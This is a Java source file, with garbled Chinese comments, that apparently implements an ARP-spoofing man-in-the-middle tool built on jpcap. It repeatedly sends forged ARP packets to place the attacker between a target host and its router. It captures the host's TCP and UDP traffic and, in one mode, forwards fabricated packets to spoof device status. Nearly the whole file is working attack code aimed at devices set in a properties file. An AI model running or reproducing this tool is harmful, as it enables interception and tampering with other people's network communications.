package Manager;


import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.Properties;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.BrokenBarrierException;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.CyclicBarrier;

import org.omg.CORBA.PUBLIC_MEMBER;

import com.sun.jndi.url.iiopname.iiopnameURLContextFactory;
import com.sun.org.apache.bcel.internal.generic.DUP;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import jpcap.packet.UDPPacket;
import Factory.ARPFactory;
import Manager.Listenner.Counter_kerui;
import Manager.Listenner.Counter_yinshi;
import Manager.Listenner.PackageListenner;
import Manager.Strategy.PushUpdata;
import Model.Model_Capture;
import Model.Model_a;
import Model.TestPacketReceiver;
import Util.DealPcap.wireless802_airdump1;
import Util.SetPacket.SetARP;
import Util.SetPacket.SetTCP;

public class Manager_cheatServiceAndHost_3 {
	
	

	final BlockingQueue<Packet> sendQueue = new ArrayBlockingQueue<Packet>(10);
	static Object flag = new Object(); 
	
	//����ץȡ���������ݰ���ÿ��ץȡ���������
	CopyOnWriteArrayList<Packet> pakage_up = new CopyOnWriteArrayList<Packet>();
	
	//����ץȡ���������ݰ���ÿ��ץȡ���������
	CopyOnWriteArrayList<Packet> pakage_down = new CopyOnWriteArrayList<Packet>();
	
	//˫�߳�����������
	final  CyclicBarrier cb = new CyclicBarrier(2);
	
	//�������ݶ���
	List<Model_a> counter_data_list = new ArrayList<Model_a>();
	
	//��ʱδʹ��
	//�������ݶ���(����)
	List<Model_a> counter_heart_list_toHost = new ArrayList<Model_a>();
	List<Model_a> counter_heart_list_toService = new ArrayList<Model_a>();
	
	//α��״̬����
	List<Model_a> fake_status_list_toService = new ArrayList<Model_a>();
	
	
	//���еļ�����
	List<PackageListenner> listenners = new ArrayList<PackageListenner>();
	
	
	//�����ļ�
	static int ARP_INTERVAL;
	static int NETCARD_INDEX;
	
	static String HOST_IP;
	static String SERVICE_IP;
	static String ROUTE_IP;
	
	static String YOUR_DEVICE_MAC;
	static String TARGET_HOST_MAC;
	static String TARGET_ROUTE_MAC;
	
	static String[] LISTENNER_DEVICES; 
	
	{
		readProperties();
		
	}
	
	
	
	/*************************************************
	 * ������������ʹ��
	 *************************************************/	
	public static void main(String[] args) {
		
		Manager_cheatServiceAndHost_3 mc= new Manager_cheatServiceAndHost_3();
		
		JpcapSender js = getCrad(NETCARD_INDEX,null);
		
		//��ȡ�������ݰ�������
		
		/*************************************************
		 * ��ץȡ�����ݰ���÷������ݶ���
		 *************************************************/
		mc.recognazion_command();
		
		/*************************************************
		 * α��ARP���ݣ���ӵ��������б���
		 *************************************************/                                                       
		mc.setARPs(HOST_IP,ROUTE_IP,YOUR_DEVICE_MAC,TARGET_HOST_MAC,null);
		
		
		/************************************************* 
		 * ���������̣߳���鷢���б���Ҫ��ͣ�ķ���
		 *************************************************/
		mc.sentThread(js);
		
		/*************************************************
		 * ARP��ƭ�ɹ��󣬿�ʼ�����������͵����ݷ��뵽cpmodel��,
		 * ���Ҽ����α�����ݼ��뵽�����б�
		 *************************************************/
		mc.capPacket_run(NETCARD_INDEX,HOST_IP,SERVICE_IP,YOUR_DEVICE_MAC);
		
		
		/*************************************************
		 * ѡ��ģʽ������α���̣߳���ʼα������,����ӵ��������б�
		 * ģʽһ��ֻת������
		 * ģʽ�������������ͷ����������ݣ����ҷ���α����������ͨ��
		 *************************************************/
		mc.fakeThread(2,YOUR_DEVICE_MAC,TARGET_HOST_MAC,TARGET_ROUTE_MAC,HOST_IP);
		
	}
	
	
	/*************************************************
	 * ��������,Ϊ���������ʱ�ṩ�ӿ�
	 *************************************************/
	public void start(){
		
		//��ȡ�������ݰ�������
		JpcapSender js = getCradByMAC("");
		
		//��ȡ�������ݰ�������
		
		/*************************************************
		 * ��ץȡ�����ݰ���÷������ݶ���
		 *************************************************/
		recognazion_command();
		
		/*************************************************
		 * α��ARP���ݣ���ӵ��������б���
		 *************************************************/                                                       
		setARPs(HOST_IP,ROUTE_IP,YOUR_DEVICE_MAC,TARGET_HOST_MAC,null);
		
		
		/************************************************* 
		 * ���������̣߳���鷢���б���Ҫ��ͣ�ķ���
		 *************************************************/
	     sentThread(js);
		
		/*************************************************
		 * ARP��ƭ�ɹ��󣬿�ʼ�����������͵����ݷ��뵽cpmodel��,
		 * ���Ҽ����α�����ݼ��뵽�����б�
		 *************************************************/
		capPacket_runByMAC("",HOST_IP,SERVICE_IP,YOUR_DEVICE_MAC);
		
		
		/*************************************************
		 * ѡ��ģʽ������α���̣߳���ʼα������,����ӵ��������б�
		 * ģʽһ��ֻת������
		 * ģʽ�������������ͷ����������ݣ����ҷ���α����������ͨ��
		 *************************************************/
		fakeThread(2,YOUR_DEVICE_MAC,TARGET_HOST_MAC,TARGET_ROUTE_MAC,HOST_IP);
	}
	
	
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * ��ץȡ�����ݰ���ʶ����������ݶ���
	 *************************************************/
	public void recognazion_command(){
		Runnable run = new Runnable() {
			
			@Override
			public void run() {
				
				
				if(LISTENNER_DEVICES.length!=0 && !LISTENNER_DEVICES[0].equals("")){
					
					for(String device:LISTENNER_DEVICES){
						
						try {
							
							listenners.add((PackageListenner)( Class.forName(device).getConstructor(BlockingQueue.class).newInstance(sendQueue) ));
							
						} catch (InstantiationException
								| IllegalAccessException
								| IllegalArgumentException
								| InvocationTargetException
								| NoSuchMethodException | SecurityException
								| ClassNotFoundException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
							
						
					}
					System.out.println("�����豸��ӳɹ�:"+listenners.size());
					
				}
				
				
					/*PackageListenner kerui = new Counter_kerui(sendQueue);
					PackageListenner yinshi = new Counter_yinshi(sendQueue);
					listenners.add(kerui);
					listenners.add(yinshi);*/
				
					try {
						cb.await();
					} catch (InterruptedException | BrokenBarrierException e){
						e.printStackTrace();
					}
					
					
			}
		};
		
		System.out.println("��ʼ�������ƶ���");
		new Thread(run).start();
	}
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * ץ���̵߳�һ��������������ţ�����������IP�ͷ�����IP,����MAC��ַ
	 *************************************************/
	public  void capPacket_runByMAC(String mac,final String host_ip, final String service_ip ,final String yourMAC){
	    
	       try{    
	            //��ȡ�����ϵ�����ӿڶ�������    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList(); 
	     NetworkInterface nc = null;
	     for(int i=0;i<devices.length;i++){
	    	 
	    	 if(bytesToHexString(devices[i].mac_address).equals(mac)){
	    		 nc = devices[i];
	    		 break;
	    	 }
	    	 
	     }
	        //����ĳ�������ϵ�ץȡ����,�������һ����ץ����СΪ2000byte
	        final JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        
	         Runnable run = new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					System.out.println("����ץ���߳�");
					//�Ƿ�ÿһ����Ҫ��ͬ��Pr
					TestPacketReceiver pr = new TestPacketReceiver(host_ip,yourMAC);
					while(true){
						startCapThread(jpcap,host_ip,service_ip,pr);
					}	
				}
			};
			
			new Thread(run).start();
	            
	        System.out.println("׼����ȡ"+mac+"�ϵ�����");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("����ʧ��:  "+ef);    
	        }      
	   }
	
	
	/*************************************************
	 * ץ���̵߳�һ��������������ţ�����������IP�ͷ�����IP
	 *************************************************/
	public  void capPacket_run(int i,final String host_ip, final String service_ip ,final String yourMAC){
	    
	       try{    
	            //��ȡ�����ϵ�����ӿڶ�������    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList();    
	            
	        NetworkInterface nc=devices[i];    
	        //����ĳ�������ϵ�ץȡ����,�������һ����ץ����СΪ2000byte
	        final JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        
	         Runnable run = new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					System.out.println("����ץ���߳�");
					//�Ƿ�ÿһ����Ҫ��ͬ��Pr
					TestPacketReceiver pr = new TestPacketReceiver(host_ip,yourMAC);
					while(true){
						startCapThread(jpcap,host_ip,service_ip,pr);
					}	
				}
			};
			
			new Thread(run).start();
	            
	        System.out.println("׼����ȡ��"+i+"�������ϵ�����");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("����ʧ��:  "+ef);    
	        }      
	   }
	    //��Captor�ŵ������߳�������    
	   public  void startCapThread(final JpcapCaptor jpcap,final String host_ip,final String service_ip,TestPacketReceiver pr){    
	       //JpcapCaptor jp=jpcap;    
    	  // while(true){}    
  		 //ʹ�ýӰ�������ѭ��ץ��-1��ʾ�����Ƶ�ץȡ���ݰ�   "192.168.8.101","119.29.42.117"
  		  jpcap.loopPacket(1, pr);
  		  
  		  if(pr.getPacket() != null){

  			  Packet packet = pr.getPacket();
  			  //TCP֡ 
  			  if(packet instanceof jpcap.packet.TCPPacket){
  				  TCPPacket tcpPacket = (TCPPacket)packet;
  				  
  				  if(tcpPacket.syn){
  					  
  					  System.out.println("����֡......����cpmodelʧ��");
  					  	
  				  }
  				  //&&service_ip.equals(tcpPacket.dst_ip.getHostAddress())
  				//��������
  				  else if(host_ip.equals(tcpPacket.src_ip.getHostAddress())){
  					  if(pakage_up.size() == 0){
  						
  						 pakage_up.add(tcpPacket);
  						 System.out.println("����TCP����");
  						 System.out.println("packet_up��ʼ���ɹ�");
  					  }
  					  else{
  						  TCPPacket packet2 = (TCPPacket) pakage_up.get(0);
  						  if(packet2.ack_num == tcpPacket.ack_num&&packet2.sequence == tcpPacket.sequence&&packet2.data.length==tcpPacket.data.length){
  							
  							 // System.out.println("�ظ�֡��δ����packet_up");
  						  }else{
  							  
  							  pakage_up.set(0, tcpPacket);
  							  System.out.println("����TCP����");
  							  System.out.println("��TCP���ݣ�����packet_up");
  						  }
  						  
  					  }
  					  
  				  }
  				  //&&service_ip.equals(tcpPacket.src_ip.getHostAddress())
  				//����������
  				  else if(host_ip.equals(tcpPacket.dst_ip.getHostAddress())){
  					  if(pakage_down.size() == 0){
  						  pakage_down.add(tcpPacket);
  						 System.out.println("����TCP����");
  						  System.out.println("packet_down��ʼ��");
  					  }
  					  else{
  						  TCPPacket packet2 = (TCPPacket) pakage_down.get(0); 
  						  if(packet2.ack_num == tcpPacket.ack_num&&packet2.sequence == tcpPacket.sequence&&packet2.data.length==tcpPacket.data.length){
  							  
  							  //System.out.println("�ظ�֡��δ����packet_down");
  						  }else{
  							  pakage_down.set(0, tcpPacket);
  							 System.out.println("����TCP����");
  							  System.out.println("��TCP���ݣ�����packet_down");
  							  
  						  }	  
  					  }
  				  }
  			  }	  
  			  
  			  else if(packet instanceof UDPPacket){
  				  //udp���ݰ�������ǰ����
  				  
  				  UDPPacket udpPacket = (UDPPacket)packet;
  				  
  				  if(host_ip.equals(udpPacket.src_ip.getHostAddress())){
  					  
  					  System.out.println("����UDP����");
  					  if(pakage_up.size()==0){
  						 
  						  pakage_up.set(0, udpPacket);
  						System.out.println("packet_up��ʼ���ɹ�");
  						
  					  }
  					  else {
  						 pakage_up.set(0, udpPacket);
  						System.out.println("��UDP���ݣ�����packet_up");
					}
  					  
  				  }
  				  else if(host_ip.equals(udpPacket.dst_ip.getHostAddress())) {
  					  System.out.println("����UDP����");
  					  if(pakage_down.size()==0){
  						  pakage_down.set(0, udpPacket);
  						System.out.println("packet_down��ʼ���ɹ�");
  						
  					  }
  					  else {
  						 pakage_down.set(0, udpPacket);
  						System.out.println("��UDP���ݣ�����packet_down");
					}
  				  }
  				  
  				  
  			  }
  			  
  		  }  
  	   
       
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	 /*************************************************
	 * �����߳�
	 *************************************************/
	   public void sentThread(final JpcapSender js){
		   
		   java.lang.Runnable runner = new Runnable(){

				@Override
				public void run() {
					
					try {
						//��ͣ�ķ���
						while(true){
							if(js != null){
									
								Packet packet = sendQueue.take();
								if(packet instanceof jpcap.packet.ARPPacket){
									
									System.out.println("sending arp.."); 
									
								}
								if(packet instanceof jpcap.packet.TCPPacket){
									
									TCPPacket tcpPacket = (TCPPacket)packet;
									System.out.println("sending TCPtohost.."+"seq|"+tcpPacket.sequence+
														" ack|"+tcpPacket.ack_num);
								}
								if(packet instanceof jpcap.packet.UDPPacket){
									
									UDPPacket udp = (UDPPacket) packet;
									System.out.println("sending UDP...."+"  lenth:"+udp.data.length);
								}
								
								js.sendPacket(packet);
							}
							
						}
					} catch (Exception e) {
						System.out.println("���������̳߳���");
						e.printStackTrace();
					}
				}
				
			};
			
			Thread senThread = new Thread(runner);
			senThread.start();
			//new Thread(runner).start();
		   System.out.println("�����߳�����");
		   
	   } 
	 /*************************************************
	 * end
	 *************************************************/
	   
	 /*************************************************
	 * ARPs����
	 *************************************************/
	   public  void setARPs(String hostIP,String routeIP,String yourMAC,String deviceMAC,String routeMAC){
		  
		   ARPFactory arpFactory = null;
		   if(routeMAC == null){
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC);
		   }else{
			   
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC, routeMAC);
		   }
		  
		   final ARPFactory arpFactory1 = arpFactory;
		  Runnable run = new Runnable() {
			
			@Override
			public void run() {
				Set<ARPPacket> ARPs = null;
				Iterator<ARPPacket> it = null;
				while(true){
					ARPs = arpFactory1.getInstance();
					it = ARPs.iterator();
					//��arp���뷢�Ͷ���
					while(it.hasNext()){
						try {
							sendQueue.put(it.next());
						} catch (InterruptedException e) {
							e.printStackTrace();
						}	
					}
					//ÿ����һ��ָֹͣ����ʱ��ARP_INTERVAL
					try {
						Thread.sleep(ARP_INTERVAL);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		  };
		  
		  
		  new Thread(run).start();
		  
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	  /*************************************************
	 * α�����ݰ��߳�,��Ϊ����ģʽ
	 *************************************************/
	  public  void fakeThread(int flags,final String  yourMAC,final String hostMAC,final String rounteMAC,final String host_ip){
		   
		   //ģʽһΪֱ��ת�����յ�������

		   //ģʽ2Ϊ���ضԷ�����,ת���Լ�α�������
		    //if(flag == 2){
			   java.lang.Runnable runner = new  Runnable() {
				   public void run() {
					  // System.out.println("���뵽α���߳�1");
					  // int step = 0;
					   try {
							  //�ȴ����ƶ��д����ɹ�
							cb.await();
						} catch (InterruptedException | BrokenBarrierException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					   
					   Packet packet_up = null;
					   Packet packet_down = null;
					   
					   PushUpdata pushUpdata = new PushUpdata(yourMAC, hostMAC, rounteMAC, host_ip);
					   
					   if(listenners.size()!=0){
						   for(PackageListenner listenner : listenners){
							   
							   pushUpdata.addListenner(listenner);
							
						   }
						   
					   }
					   
					  while(true){	
						  	//�������豸�ķ���ͨ��
						  if(pakage_up.size() != 0){
							  //fake(packet_up, pakage_up, yourMAC, hostMAC, rounteMAC);
							 packet_up =  pushUpdata.pushAfterDeal(packet_up, pakage_up.get(0));
						  }
 
						  //�������ķ���ͨ��
						  if(pakage_down.size() != 0){
							 // fake(packet_down, pakage_down, yourMAC, hostMAC, rounteMAC);
							 packet_down =  pushUpdata.pushAfterDeal(packet_down, pakage_down.get(0));
						  }
					 }
				   }
			   };  
			   
			   Thread fakeThread = new Thread(runner);
			   fakeThread.start();
		   //}
		    
	   }
	   /*************************************************
	   * end
	   *************************************************/
	  
	   /*************************************************
	   * ��ȡ�����������ݵ�����
	   *************************************************/
		public static JpcapSender getCrad(int deviceNum,String NetCard_MAC){
				  
					NetworkInterface[] devices = null;
					 try{    
						 //��ȡ�����ϵ�����ӿڶ�������    
						  devices = JpcapCaptor.getDeviceList();
System.out.println("������ȡ�ɹ�  ");  
						 }catch(Exception ef){    
						            ef.printStackTrace();    
System.out.println("��ʾ����ӿ�����ʧ��:  "+ef);    
						    }  
					 
					JpcapSender js = null;
					
					try {
						js = JpcapSender.openDevice(devices[deviceNum]);
System.out.println("�ѻ�ȡ����(����ʹ��)  "+deviceNum+"  JSender�����ɹ�");  				
					} catch (IOException e1) {
System.out.println("JSender�������ɹ�");
						e1.printStackTrace();
					}
					  
				  return js;
			  } 
			  /*************************************************
			 * end
			 *************************************************/
		
		/*************************************************
		 * �ֽ�����ת��
		 *************************************************/
		public static String  bytesToHexString(byte[] src){  
		    StringBuilder stringBuilder = new StringBuilder("");  
		    if (src == null || src.length <= 0) {  
		        return null;  
		    }  
		    for (int i = 0; i < src.length; i++) {  
		        int v = src[i] & 0xFF;  
		        String hv = Integer.toHexString(v);  
		        if (hv.length() < 2) {  
		            stringBuilder.append(0);  
		        }  
		        stringBuilder.append(hv);  
		    }  
		    return stringBuilder.toString();  
		} 
		
		
		/*************************************************
		 * end
		 *************************************************/
		
		
		/*************************************************
		   * ��ȡ�����������ݵ�����------����MAC��ַ
		   *************************************************/
			public static JpcapSender getCradByMAC(String mac){
					  
						NetworkInterface[] devices = null;
						 try{    
							 //��ȡ�����ϵ�����ӿڶ�������    
							  devices = JpcapCaptor.getDeviceList();
	System.out.println("������ȡ�ɹ�  ");  
							 }catch(Exception ef){    
							            ef.printStackTrace();    
	System.out.println("��ʾ����ӿ�����ʧ��:  "+ef);    
							    }  
						JpcapSender js = null;
						
						for(int i = 0 ;i<devices.length;i++){
							if(bytesToHexString(devices[i].mac_address).equals(mac)){
								
								try {
									js = JpcapSender.openDevice(devices[i]);
			System.out.println("�ѻ�ȡ����(����ʹ��)  "+i+"   mac:"+ mac+"  JSender�����ɹ�");  				
								} catch (IOException e1) {
			System.out.println("JSender�������ɹ�");
									e1.printStackTrace();
								}
								break;
							}
						}
					  return js;
				  } 
				  /*************************************************
				 * end
				 *************************************************/
		
		
		
		
		/*************************************************
		 * ��ȡ�����ļ�prameter.properties
		 *************************************************/
		  public void readProperties(){
			  	
				Properties prop = new Properties();
				InputStream in = Object. class .getResourceAsStream( "/counterProperties.properties" );    
		        try  {    
		           prop.load(in);    
		 
		           ARP_INTERVAL = Integer.parseInt(prop.getProperty( "ARP_INTERVAL" ).trim()); 
		           NETCARD_INDEX = Integer.parseInt(prop.getProperty( "NETCARD_INDEX" ).trim());
		           HOST_IP = prop.getProperty( "HOST_IP" ).trim();
		           if(!prop.getProperty( "SERVICE_IP" ).trim().equals("")){
		        	   SERVICE_IP = prop.getProperty( "SERVICE_IP" ).trim();  
		           }else {
		        	   SERVICE_IP = null;
				}
		           
		           ROUTE_IP = prop.getProperty( "ROUTE_IP" ).trim();
		           YOUR_DEVICE_MAC = prop.getProperty( "YOUR_DEVICE_MAC" ).trim();
		           TARGET_HOST_MAC = prop.getProperty( "TARGET_HOST_MAC" ).trim();
		           TARGET_ROUTE_MAC = prop.getProperty( "TARGET_ROUTE_MAC" ).trim();
		           LISTENNER_DEVICES =  prop.getProperty( "LISTENNER_DEVICES" ).trim().split(",");
		           
		           
		           /*
		           String[] ss1  =  prop.getProperty( "INT_INDEX" ).trim().split(",");
		           if(ss1.length != 0){ 
		        	   INT_INDEX = new int[ss1.length];
		        	   for(int i = 0;i<ss1.length;i++){  
			        	   INT_INDEX[i] = Integer.parseInt(ss1[i]);
			           } 
		           }
		           
		           
		           String[] ss2 =  prop.getProperty( "HEART_INDEX_UP" ).trim().split(",");
		           if(!ss2[0].equals("")){ 
		        	   HEART_INDEX_UP = new int[ss2.length];
		        	   for(int i = 0;i<ss2.length;i++){  
		        		   HEART_INDEX_UP[i] = Integer.parseInt(ss2[i]);
			           } 
		           }
		           
		           String[] ss3 =  prop.getProperty( "HEART_INDEX_DOWN" ).trim().split(",");
		      
		           if(!ss3[0].equals("")){ 
		        	   HEART_INDEX_DOWN = new int[ss3.length];
		        	   for(int i = 0;i<ss3.length;i++){  
		        		   HEART_INDEX_DOWN[i] = Integer.parseInt(ss3[i]);
			           } 
		           }
		           
		           
		           String[] ss4 =  prop.getProperty( "STATUS_INDEX_TOSERVICE" ).trim().split(",");
				      
		           if(!ss4[0].equals("")){ 
		        	   STATUS_INDEX_TOSERVICE = new int[ss4.length];
		        	   for(int i = 0;i<ss4.length;i++){  
		        		   STATUS_INDEX_TOSERVICE[i] = Integer.parseInt(ss4[i]);
			           } 
		           }*/
		           
		       }  catch  (IOException e) {    
		           e.printStackTrace();    
		       }  
		         
		        
		        /*
		        File fileB = new File( this.getClass().getResource( "" ).getPath());  
		        
		        System. out .println( "fileB path: " + fileB);*/  
		  }
		  /*************************************************
		 * end
		 *************************************************/
}    